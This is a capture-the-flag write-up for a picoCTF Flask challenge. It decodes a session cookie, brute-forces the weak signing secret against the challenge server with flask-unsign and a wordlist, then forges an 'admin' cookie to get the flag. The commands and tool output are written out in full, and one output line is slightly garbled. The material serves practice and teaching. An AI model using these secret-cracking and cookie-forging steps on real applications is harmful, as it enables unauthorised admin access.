# More Cookies

## Information about the CTF
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:44693/

## How to solve it
When we go to the website, an input field is displayed. When trying to enter "snickerdoodle" (placeholder text) and then looking for our cookies, the following appears:

```
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZAMz3A.Ea3ooPcSldiFactHJlmTOGp47jM
```

Which could seem like a JTW token, lets try to see if we can decode it using [jwt.io](https://jwt.io/). Well, we can see the following:

```
{
  "very_auth": "snickerdoodle"
}
```
But the signature is invalid, so it might be a Flask session cookie. 

To decode it, we can use [flask-unsign](https://pypi.org/project/flask-unsign/) which is a tool to decode and unsign Flask session cookies. 

Lets start with creating a virtual environment.

```bash
$ sudo apt-get install python3-venv
$ python -m venv venv
$ source venv/bin/activate
```

Then we can install flask-unsign using pip.

```bash
$ pip3 install flask-unsign
```
Lets now try to decode the cookie.

```bash
$ flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZAMz3A.Ea3ooPcSldiFactHJlmTOGp47jM'
# {'very_auth': 'snickerdoodle'}
```

We can see that the cookie is valid, but we can't use it to login. So lets try to bruteforce the secret key using the known users from another CTF. See `wordlist.txt`.

```bash
$ flask-unsign --unsign --server 'http://mercury.picoctf.net:44693/' --wordlist wordlist.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZANBNQ.re61FuODEiBW2x-9T3KhHAjDuzo
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
```

And the secret key is `butter`. Now we can use the tool [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) to generate our own cookie.

First lets install the tool.
```bash
$ git clone https://github.com/noraj/flask-session-cookie-manager.git && cd flask-session-cookie-manager
$ python setup.py install
```

Then we can generate our own cookie.

```bash
python3 flask_session_cookie_manager3.py encode -s butter -t "{'very_auth':'admin'}"
# eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZANBtw.2YczjPagyHttZohpNIidWNEM6iw
```

Changing the cookie to our newly created one and then refreshing the page, we can see that we are now logged in as admin and we can see the flag.

